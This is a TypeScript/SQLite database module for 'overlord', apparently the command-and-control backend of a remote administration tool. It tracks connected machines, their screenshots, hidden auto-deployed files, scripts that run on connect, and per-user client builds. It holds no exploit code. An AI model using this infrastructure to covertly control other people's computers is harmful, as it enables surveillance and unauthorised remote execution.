import Database from "bun:sqlite";
import { ClientInfo, ListFilters, ListResult, ClientRole } from "./types";
import { getThumbnail } from "./thumbnails";
import { resolve } from "path";
import { ensureDataDir } from "./paths";

const dataDir = ensureDataDir();
const dbPath = resolve(dataDir, "overlord.db");
const db = new Database(dbPath);
console.log(`[db] Using database at: ${dbPath}`);

db.run(`
  CREATE TABLE IF NOT EXISTS clients (
    id TEXT PRIMARY KEY,
    hwid TEXT,
    role TEXT,
    ip TEXT,
    host TEXT,
    os TEXT,
    arch TEXT,
    version TEXT,
    user TEXT,
    nickname TEXT,
    custom_tag TEXT,
    custom_tag_note TEXT,
    monitors INTEGER,
    country TEXT,
    last_seen INTEGER,
    online INTEGER,
    ping_ms INTEGER,
    bookmarked INTEGER NOT NULL DEFAULT 0
  );
`);
try {
  db.run(`ALTER TABLE clients ADD COLUMN role TEXT`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN hwid TEXT`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN ip TEXT`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN nickname TEXT`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN custom_tag TEXT`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN custom_tag_note TEXT`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN bookmarked INTEGER NOT NULL DEFAULT 0`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN enrollment_status TEXT NOT NULL DEFAULT 'pending'`);
} catch {}
try {
  db.run(`UPDATE clients SET enrollment_status='pending' WHERE enrollment_status IS NULL`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN public_key TEXT`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN key_fingerprint TEXT`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN enrolled_at INTEGER`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN enrolled_by TEXT`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN cpu TEXT`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN gpu TEXT`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN ram TEXT`);
} catch {}
db.run(
  `CREATE INDEX IF NOT EXISTS idx_clients_public_key ON clients(public_key);`,
);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_clients_key_fingerprint ON clients(key_fingerprint);`,
);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_clients_enrollment_status ON clients(enrollment_status);`,
);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_clients_online_last_seen ON clients(online, last_seen DESC);`,
);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_clients_os_last_seen ON clients(os, last_seen DESC);`,
);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_clients_ping_ms ON clients(ping_ms);`,
);
try {
  db.run(`ALTER TABLE clients ADD COLUMN disconnect_reason TEXT`);
} catch {}
try {
  db.run(`ALTER TABLE clients ADD COLUMN disconnect_detail TEXT`);
} catch {}

db.run(`
  CREATE TABLE IF NOT EXISTS banned_ips (
    ip TEXT PRIMARY KEY,
    reason TEXT,
    created_at INTEGER NOT NULL
  );
`);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_banned_ips_created_at ON banned_ips(created_at DESC);`,
);

db.run(`
  CREATE TABLE IF NOT EXISTS revoked_tokens (
    token_hash TEXT PRIMARY KEY,
    expires_at INTEGER NOT NULL
  );
`);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_revoked_tokens_expires ON revoked_tokens(expires_at);`,
);

db.run(`
  CREATE TABLE IF NOT EXISTS builds (
    id TEXT PRIMARY KEY,
    status TEXT NOT NULL,
    start_time INTEGER NOT NULL,
    expires_at INTEGER NOT NULL,
    files TEXT NOT NULL,
    build_tag TEXT,
    built_by_user_id INTEGER
  );
`);

try { db.run(`ALTER TABLE builds ADD COLUMN build_tag TEXT`); } catch {}
try { db.run(`ALTER TABLE builds ADD COLUMN built_by_user_id INTEGER`); } catch {}
db.run(`CREATE INDEX IF NOT EXISTS idx_builds_build_tag ON builds(build_tag);`);

db.run(`
  CREATE TABLE IF NOT EXISTS notification_screenshots (
    id TEXT PRIMARY KEY,
    notification_id TEXT NOT NULL,
    client_id TEXT NOT NULL,
    ts INTEGER NOT NULL,
    format TEXT NOT NULL,
    width INTEGER,
    height INTEGER,
    bytes BLOB NOT NULL
  );
`);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_notification_screenshots_notification_id ON notification_screenshots(notification_id);`,
);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_notification_screenshots_ts ON notification_screenshots(ts DESC);`,
);

db.run(`
  CREATE TABLE IF NOT EXISTS push_subscriptions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    endpoint TEXT NOT NULL UNIQUE,
    p256dh TEXT NOT NULL,
    auth TEXT NOT NULL,
    created_at INTEGER NOT NULL
  );
`);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_push_subscriptions_user_id ON push_subscriptions(user_id);`,
);
db.run(
  `CREATE UNIQUE INDEX IF NOT EXISTS idx_push_subscriptions_endpoint ON push_subscriptions(endpoint);`,
);

db.run(`
  CREATE TABLE IF NOT EXISTS auto_scripts (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    trigger TEXT NOT NULL,
    script TEXT NOT NULL,
    script_type TEXT NOT NULL,
    enabled INTEGER NOT NULL,
    created_at INTEGER NOT NULL,
    updated_at INTEGER NOT NULL
  );
`);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_auto_scripts_trigger ON auto_scripts(trigger, enabled);`,
);
try {
  db.run(`ALTER TABLE auto_scripts ADD COLUMN os_filter TEXT NOT NULL DEFAULT '[]'`);
} catch { /* column already exists */ }

db.run(`
  CREATE TABLE IF NOT EXISTS auto_script_runs (
    script_id TEXT NOT NULL,
    client_id TEXT NOT NULL,
    ts INTEGER NOT NULL,
    PRIMARY KEY (script_id, client_id)
  );
`);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_auto_script_runs_ts ON auto_script_runs(ts DESC);`,
);

db.run(`
  CREATE TABLE IF NOT EXISTS auto_deploys (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    trigger TEXT NOT NULL,
    file_path TEXT NOT NULL,
    file_name TEXT NOT NULL,
    file_size INTEGER NOT NULL,
    file_os TEXT NOT NULL,
    args TEXT NOT NULL DEFAULT '',
    hide_window INTEGER NOT NULL DEFAULT 1,
    enabled INTEGER NOT NULL,
    os_filter TEXT NOT NULL DEFAULT '[]',
    created_at INTEGER NOT NULL,
    updated_at INTEGER NOT NULL
  );
`);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_auto_deploys_trigger ON auto_deploys(trigger, enabled);`,
);

db.run(`
  CREATE TABLE IF NOT EXISTS auto_deploy_runs (
    deploy_id TEXT NOT NULL,
    client_id TEXT NOT NULL,
    ts INTEGER NOT NULL,
    PRIMARY KEY (deploy_id, client_id)
  );
`);
db.run(
  `CREATE INDEX IF NOT EXISTS idx_auto_deploy_runs_ts ON auto_deploy_runs(ts DESC);`,
);

export function upsertClientRow(
  partial: Partial<ClientInfo> & {
    id: string;
    lastSeen?: number;
    online?: number;
  },
) {
  const now = partial.lastSeen ?? Date.now();
  db.run(
    `INSERT INTO clients (id, hwid, role, ip, host, os, arch, version, user, nickname, custom_tag, custom_tag_note, monitors, country, last_seen, online, ping_ms, enrollment_status, public_key, key_fingerprint, cpu, gpu, ram)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     ON CONFLICT(id) DO UPDATE SET
       hwid=COALESCE(excluded.hwid, clients.hwid),
       role=COALESCE(excluded.role, clients.role),
       ip=COALESCE(excluded.ip, clients.ip),
       host=COALESCE(excluded.host, clients.host),
       os=COALESCE(excluded.os, clients.os),
       arch=COALESCE(excluded.arch, clients.arch),
       version=COALESCE(excluded.version, clients.version),
       user=COALESCE(excluded.user, clients.user),
      nickname=clients.nickname,
      custom_tag=clients.custom_tag,
      custom_tag_note=clients.custom_tag_note,
       monitors=COALESCE(excluded.monitors, clients.monitors),
       country=COALESCE(excluded.country, clients.country),
       last_seen=excluded.last_seen,
       online=COALESCE(excluded.online, clients.online),
       ping_ms=COALESCE(excluded.ping_ms, clients.ping_ms),
       enrollment_status=CASE WHEN excluded.enrollment_status <> 'pending' THEN excluded.enrollment_status ELSE clients.enrollment_status END,
       public_key=COALESCE(excluded.public_key, clients.public_key),
       key_fingerprint=COALESCE(excluded.key_fingerprint, clients.key_fingerprint),
       cpu=COALESCE(excluded.cpu, clients.cpu),
       gpu=COALESCE(excluded.gpu, clients.gpu),
       ram=COALESCE(excluded.ram, clients.ram)
    `,
    partial.id,
    partial.hwid ?? partial.id,
    partial.role ?? null,
    partial.ip ?? null,
    partial.host ?? null,
    partial.os ?? null,
    partial.arch ?? null,
    partial.version ?? null,
    partial.user ?? null,
    partial.nickname ?? null,
    partial.customTag ?? null,
    partial.customTagNote ?? null,
    partial.monitors ?? null,
    partial.country ?? null,
    now,
    partial.online ?? 0,
    partial.pingMs ?? null,
    partial.enrollmentStatus ?? "pending",
    partial.publicKey ?? null,
    partial.keyFingerprint ?? null,
    partial.cpu ?? null,
    partial.gpu ?? null,
    partial.ram ?? null,
  );

  if (partial.hwid) {
    db.run(
      `DELETE FROM clients WHERE hwid=? AND id<>?`,
      partial.hwid,
      partial.id,
    );
  }
}

export function setOnlineState(id: string, online: boolean, disconnectReason?: string, disconnectDetail?: string) {
  if (online) {
    db.run(
      `UPDATE clients SET online=1, last_seen=?, disconnect_reason=NULL, disconnect_detail=NULL WHERE id=?`,
      Date.now(),
      id,
    );
  } else {
    db.run(
      `UPDATE clients SET online=0, last_seen=?, disconnect_reason=?, disconnect_detail=? WHERE id=?`,
      Date.now(),
      disconnectReason ?? null,
      disconnectDetail ?? null,
      id,
    );
  }
}

export function deleteClientRow(id: string) {
  db.run(`DELETE FROM clients WHERE id=?`, id);
}

export function deleteOfflineClientRows(): number {
  const result = db.run(`DELETE FROM clients WHERE online=0`);
  return (result as any)?.changes || 0;
}

export function getClientOnlineState(id: string): boolean | null {
  const row = db.query<{ online: number }>(`SELECT online FROM clients WHERE id=?`).get(id);
  if (!row) return null;
  return row.online === 1;
}

export function setClientNickname(id: string, nickname: string | null): boolean {
  const result = db.run(
    `UPDATE clients SET nickname=? WHERE id=?`,
    nickname && nickname.trim() ? nickname.trim() : null,
    id,
  );
  return ((result as any)?.changes || 0) > 0;
}

export function getClientNickname(id: string): string | null {
  const row = db.query<{ nickname: string | null }>(`SELECT nickname FROM clients WHERE id=?`).get(id);
  return row?.nickname ?? null;
}

export function setClientTag(
  id: string,
  tag: string | null,
  note: string | null,
): boolean {
  const normalizedTag = tag && tag.trim() ? tag.trim() : null;
  const normalizedNote = normalizedTag ? note ?? null : null;
  const result = db.run(
    `UPDATE clients SET custom_tag=?, custom_tag_note=? WHERE id=?`,
    normalizedTag,
    normalizedNote,
    id,
  );
  return ((result as any)?.changes || 0) > 0;
}

export function getClientIp(id: string): string | null {
  const row = db.query<{ ip: string }>(`SELECT ip FROM clients WHERE id=?`).get(id);
  return row?.ip || null;
}

export function banIp(ip: string, reason?: string) {
  db.run(
    `INSERT OR REPLACE INTO banned_ips (ip, reason, created_at) VALUES (?, ?, ?)`
    , ip,
    reason || null,
    Date.now(),
  );
}

export function unbanIp(ip: string) {
  db.run(`DELETE FROM banned_ips WHERE ip=?`, ip);
}

export type BannedIpEntry = {
  ip: string;
  reason: string | null;
  createdAt: number;
};

export function listBannedIps(): BannedIpEntry[] {
  const rows = db
    .query<{ ip: string; reason: string | null; createdAt: number }>(
      `SELECT ip, reason, created_at as createdAt FROM banned_ips ORDER BY created_at DESC`,
    )
    .all();

  return rows.map((row) => ({
    ip: row.ip,
    reason: row.reason,
    createdAt: Number(row.createdAt) || 0,
  }));
}

export function isIpBanned(ip: string): boolean {
  const row = db.query<{ ip: string }>(`SELECT ip FROM banned_ips WHERE ip=?`).get(ip);
  return !!row?.ip;
}

// ── Revoked token persistence ──

function hashToken(token: string): string {
  return new Bun.CryptoHasher("sha256").update(token).digest("hex");
}

export function persistRevokedToken(token: string, expiresAt: number): void {
  db.run(
    `INSERT OR IGNORE INTO revoked_tokens (token_hash, expires_at) VALUES (?, ?)`,
    hashToken(token),
    expiresAt,
  );
}

export function isTokenRevoked(token: string): boolean {
  const row = db.query<{ token_hash: string }>(
    `SELECT token_hash FROM revoked_tokens WHERE token_hash=?`,
  ).get(hashToken(token));
  return !!row;
}

export function loadAllRevokedTokenHashes(): Set<string> {
  const now = Math.floor(Date.now() / 1000);
  const rows = db.query<{ token_hash: string }>(
    `SELECT token_hash FROM revoked_tokens WHERE expires_at > ?`,
  ).all(now);
  return new Set(rows.map((r) => r.token_hash));
}

export function pruneExpiredRevokedTokens(): number {
  const now = Math.floor(Date.now() / 1000);
  const result = db.run(`DELETE FROM revoked_tokens WHERE expires_at <= ?`, now);
  return result.changes;
}

export function markAllClientsOffline() {
  db.run(`UPDATE clients SET online=0`);
  console.log("[db] marked all clients as offline");
}

export function listClients(filters: ListFilters): ListResult {
  const {
    page,
    pageSize,
    search,
    sort,
    statusFilter,
    osFilter,
    countryFilter,
    enrollmentFilter,
    allowedClientIds,
    deniedClientIds,
  } = filters;
  const where: string[] = [];
  const params: any[] = [];

  if (search) {
    where.push(
      "(LOWER(COALESCE(host,'')) LIKE ? OR LOWER(COALESCE(user,'')) LIKE ? OR LOWER(COALESCE(nickname,'')) LIKE ? OR LOWER(COALESCE(custom_tag,'')) LIKE ? OR LOWER(COALESCE(custom_tag_note,'')) LIKE ? OR LOWER(id) LIKE ?)",
    );
    const needle = `%${search}%`;
    params.push(needle, needle, needle, needle, needle, needle);
  }

  if (statusFilter === "online") {
    where.push("online=1");
  } else if (statusFilter === "offline") {
    where.push("online=0");
  }

  if (enrollmentFilter && enrollmentFilter !== "all") {
    if (enrollmentFilter === "pending") {
      where.push("(enrollment_status='pending' OR enrollment_status IS NULL)");
    } else {
      where.push("enrollment_status=?");
      params.push(enrollmentFilter);
    }
  }

  if (osFilter && osFilter !== "all") {
    where.push("os=?");
    params.push(osFilter);
  }

  if (countryFilter && countryFilter !== "all") {
    where.push("UPPER(COALESCE(country,'ZZ'))=?");
    params.push(countryFilter.toUpperCase());
  }

  if (Array.isArray(allowedClientIds)) {
    if (allowedClientIds.length === 0) {
      where.push("1=0");
    } else {
      where.push(`id IN (${allowedClientIds.map(() => "?").join(",")})`);
      params.push(...allowedClientIds);
    }
  }

  if (Array.isArray(deniedClientIds) && deniedClientIds.length > 0) {
    where.push(`id NOT IN (${deniedClientIds.map(() => "?").join(",")})`);
    params.push(...deniedClientIds);
  }

  const whereSql = where.length ? `WHERE ${where.join(" AND ")}` : "";

  const orderBy = (() => {
    const online = "online DESC";
    const bookmark = "bookmarked DESC";
    switch (sort) {
      case "stable":
        return `ORDER BY ${online}, ${bookmark}, id ASC`;
      case "ping_asc":
        return `ORDER BY ${online}, ${bookmark}, ping_ms IS NULL, ping_ms ASC, id ASC`;
      case "ping_desc":
        return `ORDER BY ${online}, ${bookmark}, ping_ms IS NULL, ping_ms DESC, id ASC`;
      case "host_asc":
        return `ORDER BY ${online}, ${bookmark}, LOWER(COALESCE(nickname, host)) ASC, id ASC`;
      case "host_desc":
        return `ORDER BY ${online}, ${bookmark}, LOWER(COALESCE(nickname, host)) DESC, id ASC`;
      case "country_asc":
        return `ORDER BY ${online}, ${bookmark}, LOWER(COALESCE(country, 'zz')) ASC, id ASC`;
      case "country_desc":
        return `ORDER BY ${online}, ${bookmark}, LOWER(COALESCE(country, 'zz')) DESC, id ASC`;
      default:
        return `ORDER BY ${online}, ${bookmark}, last_seen DESC, id ASC`;
    }
  })();

  const totalRow = db
    .query<{ c: number }>(`SELECT COUNT(*) as c FROM clients ${whereSql}`)
    .get(...params) ?? { c: 0 };
  const onlineRow = db
    .query<{ c: number }>(
      `SELECT COUNT(*) as c FROM clients ${whereSql ? `${whereSql} AND online=1` : "WHERE online=1"}`,
    )
    .get(...params) ?? { c: 0 };
  const offset = (page - 1) * pageSize;

  const rows = db
    .query<any>(
      `SELECT id, hwid, role, host, os, arch, version, user, nickname, custom_tag as customTag, custom_tag_note as customTagNote, monitors, country, last_seen as lastSeen, online, ping_ms as pingMs, bookmarked, enrollment_status as enrollmentStatus, public_key as publicKey, key_fingerprint as keyFingerprint, cpu, gpu, ram, disconnect_reason as disconnectReason, disconnect_detail as disconnectDetail
       FROM clients
       ${whereSql}
       ${orderBy}
       LIMIT ? OFFSET ?`,
    )
    .all(...params, pageSize, offset);

  const items = rows.map((c: any) => ({
    id: c.id,
    hwid: c.hwid,
    role: (c.role as ClientRole) || "client",
    lastSeen: Number(c.lastSeen) || 0,
    host: c.host,
    os: c.os || "unknown",
    arch: c.arch || "arch?",
    version: c.version || "0",
    user: c.user,
    nickname: c.nickname || null,
    customTag: c.customTag || null,
    customTagNote: c.customTagNote ?? null,
    monitors: c.monitors,
    country: c.country || "ZZ",
    pingMs: c.pingMs ?? null,
    online: c.online === 1,
    bookmarked: c.bookmarked === 1,
    enrollmentStatus: c.enrollmentStatus || "pending",
    publicKey: c.publicKey || null,
    keyFingerprint: c.keyFingerprint || null,
    cpu: c.cpu || null,
    gpu: c.gpu || null,
    ram: c.ram || null,
    disconnectReason: c.disconnectReason || null,
    disconnectDetail: c.disconnectDetail || null,
    thumbnail: getThumbnail(c.id),
  }));

  return { page, pageSize, total: totalRow.c, online: onlineRow.c, items };
}

export type ClientMetricsSummary = {
  total: number;
  online: number;
  byOS: Record<string, number>;
  byCountry: Record<string, number>;
  byOSOnline: Record<string, number>;
  byCountryOnline: Record<string, number>;
};

export function getClientMetricsSummary(): ClientMetricsSummary {
  const counts = db
    .query<{ total: number; online: number }>(
      `SELECT COUNT(*) as total, SUM(CASE WHEN online=1 THEN 1 ELSE 0 END) as online FROM clients`,
    )
    .get() ?? { total: 0, online: 0 };

  const osRows = db
    .query<{ key: string; total: number; online: number }>(
      `SELECT
         COALESCE(NULLIF(os, ''), 'unknown') as key,
         COUNT(*) as total,
         SUM(CASE WHEN online=1 THEN 1 ELSE 0 END) as online
       FROM clients
       GROUP BY COALESCE(NULLIF(os, ''), 'unknown')`,
    )
    .all();

  const countryRows = db
    .query<{ key: string; total: number; online: number }>(
      `SELECT
         COALESCE(NULLIF(country, ''), 'ZZ') as key,
         COUNT(*) as total,
         SUM(CASE WHEN online=1 THEN 1 ELSE 0 END) as online
       FROM clients
       GROUP BY COALESCE(NULLIF(country, ''), 'ZZ')`,
    )
    .all();

  const byOS: Record<string, number> = {};
  const byOSOnline: Record<string, number> = {};
  for (const row of osRows) {
    byOS[row.key] = Number(row.total) || 0;
    byOSOnline[row.key] = Number(row.online) || 0;
  }

  const byCountry: Record<string, number> = {};
  const byCountryOnline: Record<string, number> = {};
  for (const row of countryRows) {
    byCountry[row.key] = Number(row.total) || 0;
    byCountryOnline[row.key] = Number(row.online) || 0;
  }

  return {
    total: Number(counts.total) || 0,
    online: Number(counts.online) || 0,
    byOS,
    byCountry,
    byOSOnline,
    byCountryOnline,
  };
}

export type AutoScriptTrigger = "on_connect" | "on_first_connect" | "on_connect_once";

export type AutoScript = {
  id: string;
  name: string;
  trigger: AutoScriptTrigger;
  script: string;
  scriptType: string;
  enabled: boolean;
  osFilter: string[];
  createdAt: number;
  updatedAt: number;
};

function mapAutoScriptRow(row: any): AutoScript {
  let osFilter: string[] = [];
  try {
    const parsed = JSON.parse(row.os_filter || "[]");
    osFilter = Array.isArray(parsed) ? parsed : [];
  } catch { }
  return {
    id: row.id,
    name: row.name,
    trigger: row.trigger as AutoScriptTrigger,
    script: row.script,
    scriptType: row.script_type,
    enabled: row.enabled === 1,
    osFilter,
    createdAt: Number(row.created_at) || 0,
    updatedAt: Number(row.updated_at) || 0,
  };
}

export function listAutoScripts(): AutoScript[] {
  const rows = db.query<any>(`SELECT * FROM auto_scripts ORDER BY created_at DESC`).all();
  return rows.map(mapAutoScriptRow);
}

export function getAutoScriptsByTrigger(trigger: AutoScriptTrigger): AutoScript[] {
  const rows = db
    .query<any>(
      `SELECT * FROM auto_scripts WHERE trigger=? AND enabled=1 ORDER BY created_at ASC`,
    )
    .all(trigger);
  return rows.map(mapAutoScriptRow);
}

export function getAutoScript(id: string): AutoScript | null {
  const row = db.query<any>(`SELECT * FROM auto_scripts WHERE id=?`).get(id);
  return row ? mapAutoScriptRow(row) : null;
}

export function createAutoScript(input: {
  id: string;
  name: string;
  trigger: AutoScriptTrigger;
  script: string;
  scriptType: string;
  enabled: boolean;
  osFilter: string[];
}): AutoScript {
  const now = Date.now();
  db.run(
    `INSERT INTO auto_scripts (id, name, trigger, script, script_type, enabled, os_filter, created_at, updated_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`
    ,
    input.id,
    input.name,
    input.trigger,
    input.script,
    input.scriptType,
    input.enabled ? 1 : 0,
    JSON.stringify(input.osFilter ?? []),
    now,
    now,
  );
  return getAutoScript(input.id)!;
}

export function updateAutoScript(
  id: string,
  input: Partial<{
    name: string;
    trigger: AutoScriptTrigger;
    script: string;
    scriptType: string;
    enabled: boolean;
    osFilter: string[];
  }>,
): AutoScript | null {
  const current = getAutoScript(id);
  if (!current) return null;

  const next = {
    name: input.name ?? current.name,
    trigger: (input.trigger ?? current.trigger) as AutoScriptTrigger,
    script: input.script ?? current.script,
    scriptType: input.scriptType ?? current.scriptType,
    enabled: typeof input.enabled === "boolean" ? input.enabled : current.enabled,
    osFilter: Array.isArray(input.osFilter) ? input.osFilter : current.osFilter,
  };

  db.run(
    `UPDATE auto_scripts SET name=?, trigger=?, script=?, script_type=?, enabled=?, os_filter=?, updated_at=? WHERE id=?`
    ,
    next.name,
    next.trigger,
    next.script,
    next.scriptType,
    next.enabled ? 1 : 0,
    JSON.stringify(next.osFilter),
    Date.now(),
    id,
  );

  return getAutoScript(id);
}

export function deleteAutoScript(id: string): boolean {
  const result = db.run(`DELETE FROM auto_scripts WHERE id=?`, id);
  db.run(`DELETE FROM auto_script_runs WHERE script_id=?`, id);
  return (result as any)?.changes ? (result as any).changes > 0 : true;
}

export function hasAutoScriptRun(scriptId: string, clientId: string): boolean {
  const row = db
    .query<any>(
      `SELECT script_id FROM auto_script_runs WHERE script_id=? AND client_id=?`,
    )
    .get(scriptId, clientId);
  return !!row?.script_id;
}

export function recordAutoScriptRun(scriptId: string, clientId: string) {
  db.run(
    `INSERT OR REPLACE INTO auto_script_runs (script_id, client_id, ts) VALUES (?, ?, ?)`
    ,
    scriptId,
    clientId,
    Date.now(),
  );
}

export function clientExists(id: string): boolean {
  const row = db.query<any>(`SELECT id FROM clients WHERE id=?`).get(id);
  return !!row?.id;
}

export function getClientPublicKeyById(id: string): string | null {
  const row = db.query<{ public_key: string | null }>(`SELECT public_key FROM clients WHERE id=? LIMIT 1`).get(id);
  return row?.public_key ?? null;
}

export function listDistinctCountries(): { code: string; count: number }[] {
  const rows = db
    .query<{ code: string; count: number }>(
      `SELECT UPPER(COALESCE(NULLIF(country, ''), 'ZZ')) as code, COUNT(*) as count
       FROM clients
       GROUP BY UPPER(COALESCE(NULLIF(country, ''), 'ZZ'))
       ORDER BY count DESC`,
    )
    .all();
  return rows.map((r) => ({ code: r.code, count: Number(r.count) || 0 }));
}

export function setClientBookmark(id: string, bookmarked: boolean): boolean {
  const result = db.run(
    `UPDATE clients SET bookmarked=? WHERE id=?`,
    bookmarked ? 1 : 0,
    id,
  );
  return ((result as any)?.changes || 0) > 0;
}

export function getClientBookmark(id: string): boolean {
  const row = db.query<{ bookmarked: number }>(`SELECT bookmarked FROM clients WHERE id=?`).get(id);
  return row?.bookmarked === 1;
}

export interface BuildRecord {
  id: string;
  status: string;
  startTime: number;
  expiresAt: number;
  files: Array<{
    name: string;
    filename: string;
    platform: string;
    version?: string;
    size: number;
  }>;
  buildTag?: string;
  builtByUserId?: number;
}

export function saveBuild(build: BuildRecord) {
  db.run(
    `INSERT OR REPLACE INTO builds (id, status, start_time, expires_at, files, build_tag, built_by_user_id)
     VALUES (?, ?, ?, ?, ?, ?, ?)`,
    build.id,
    build.status,
    build.startTime,
    build.expiresAt,
    JSON.stringify(build.files),
    build.buildTag || null,
    build.builtByUserId || null,
  );
}

export function getBuild(id: string): BuildRecord | null {
  const row = db.query<any>(`SELECT * FROM builds WHERE id = ?`).get(id);
  if (!row) return null;

  return {
    id: row.id,
    status: row.status,
    startTime: row.start_time,
    expiresAt: row.expires_at,
    files: JSON.parse(row.files),
    buildTag: row.build_tag || undefined,
    builtByUserId: row.built_by_user_id || undefined,
  };
}

export function getBuildByTag(buildTag: string): BuildRecord | null {
  const row = db.query<any>(`SELECT * FROM builds WHERE build_tag = ?`).get(buildTag);
  if (!row) return null;

  return {
    id: row.id,
    status: row.status,
    startTime: row.start_time,
    expiresAt: row.expires_at,
    files: JSON.parse(row.files),
    buildTag: row.build_tag || undefined,
    builtByUserId: row.built_by_user_id || undefined,
  };
}

export function getAllBuilds(userId?: number, role?: string): BuildRecord[] {
  if (role !== undefined && role !== "admin") {
    if (userId == null) {
      return [];
    }
    const rows = db
      .query<any>(`SELECT * FROM builds WHERE built_by_user_id = ? ORDER BY start_time DESC`)
      .all(userId);
    return rows.map((row) => ({
      id: row.id,
      status: row.status,
      startTime: row.start_time,
      expiresAt: row.expires_at,
      files: JSON.parse(row.files),
      buildTag: row.build_tag || undefined,
      builtByUserId: row.built_by_user_id || undefined,
    }));
  }
  const rows = db
    .query<any>("SELECT * FROM builds ORDER BY start_time DESC")
    .all();
  return rows.map((row) => ({
    id: row.id,
    status: row.status,
    startTime: row.start_time,
    expiresAt: row.expires_at,
    files: JSON.parse(row.files),
    buildTag: row.build_tag || undefined,
    builtByUserId: row.built_by_user_id || undefined,
  }));
}

export function deleteExpiredBuilds() {
  const now = Date.now();
  db.run(`DELETE FROM builds WHERE expires_at <= ?`, now);
}

export function deleteBuild(id: string) {
  db.run(`DELETE FROM builds WHERE id = ?`, id);
}

export interface NotificationScreenshotRecord {
  id: string;
  notificationId: string;
  clientId: string;
  ts: number;
  format: string;
  width?: number;
  height?: number;
  bytes: Uint8Array;
}

export function saveNotificationScreenshot(record: NotificationScreenshotRecord) {
  db.run(
    `INSERT OR REPLACE INTO notification_screenshots
      (id, notification_id, client_id, ts, format, width, height, bytes)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)`
    ,
    record.id,
    record.notificationId,
    record.clientId,
    record.ts,
    record.format,
    record.width ?? null,
    record.height ?? null,
    record.bytes,
  );
}

export function getNotificationScreenshot(notificationId: string): NotificationScreenshotRecord | null {
  const row = db
    .query<any>(
      `SELECT * FROM notification_screenshots WHERE notification_id = ? ORDER BY ts DESC LIMIT 1`,
    )
    .get(notificationId);
  if (!row) return null;

  return {
    id: row.id,
    notificationId: row.notification_id,
    clientId: row.client_id,
    ts: row.ts,
    format: row.format,
    width: row.width ?? undefined,
    height: row.height ?? undefined,
    bytes: row.bytes,
  };
}

export function clearNotificationScreenshots() {
  db.run(`DELETE FROM notification_screenshots`);
  console.log("[db] cleared notification screenshots");
}

export function getClientEnrollmentStatus(id: string): string | null {
  const row = db
    .query<{ enrollment_status: string }>(
      `SELECT enrollment_status FROM clients WHERE id=?`,
    )
    .get(id);
  return row?.enrollment_status ?? null;
}

export function setClientEnrollmentStatus(
  id: string,
  status: "approved" | "denied" | "pending",
  approvedBy?: string,
): boolean {
  const result = db.run(
    `UPDATE clients SET enrollment_status=?, enrolled_at=?, enrolled_by=? WHERE id=?`,
    status,
    status === "approved" ? Date.now() : null,
    status === "approved" ? (approvedBy ?? null) : null,
    id,
  );
  return ((result as any)?.changes || 0) > 0;
}

export function lookupClientByPublicKey(
  publicKey: string,
): { id: string; enrollmentStatus: string } | null {
  const row = db
    .query<{ id: string; enrollment_status: string }>(
      `SELECT id, enrollment_status FROM clients WHERE public_key=? LIMIT 1`,
    )
    .get(publicKey);
  if (!row) return null;
  return { id: row.id, enrollmentStatus: row.enrollment_status };
}

export function getEnrollmentStats(): {
  pending: number;
  approved: number;
  denied: number;
} {
  const rows = db
    .query<{ status: string; c: number }>(
      `SELECT COALESCE(enrollment_status,'pending') as status, COUNT(*) as c FROM clients GROUP BY enrollment_status`,
    )
    .all();
  const stats = { pending: 0, approved: 0, denied: 0 };
  for (const r of rows) {
    if (r.status === "approved") stats.approved = Number(r.c);
    else if (r.status === "denied") stats.denied = Number(r.c);
    else stats.pending = Number(r.c);
  }
  return stats;
}

export interface PushSubscriptionRecord {
  id: number;
  userId: number;
  endpoint: string;
  p256dh: string;
  auth: string;
  createdAt: number;
}

export function savePushSubscription(userId: number, endpoint: string, p256dh: string, auth: string): void {
  db.run(
    `INSERT OR REPLACE INTO push_subscriptions (user_id, endpoint, p256dh, auth, created_at)
     VALUES (?, ?, ?, ?, ?)`,
    userId, endpoint, p256dh, auth, Date.now(),
  );
}

export function deletePushSubscription(endpoint: string): void {
  db.run(`DELETE FROM push_subscriptions WHERE endpoint=?`, endpoint);
}

export function deletePushSubscriptionsByUser(userId: number): void {
  db.run(`DELETE FROM push_subscriptions WHERE user_id=?`, userId);
}

export function getPushSubscriptionsByUser(userId: number): PushSubscriptionRecord[] {
  return db
    .query<any>(`SELECT * FROM push_subscriptions WHERE user_id=?`)
    .all(userId)
    .map((r: any) => ({
      id: r.id,
      userId: r.user_id,
      endpoint: r.endpoint,
      p256dh: r.p256dh,
      auth: r.auth,
      createdAt: Number(r.created_at) || 0,
    }));
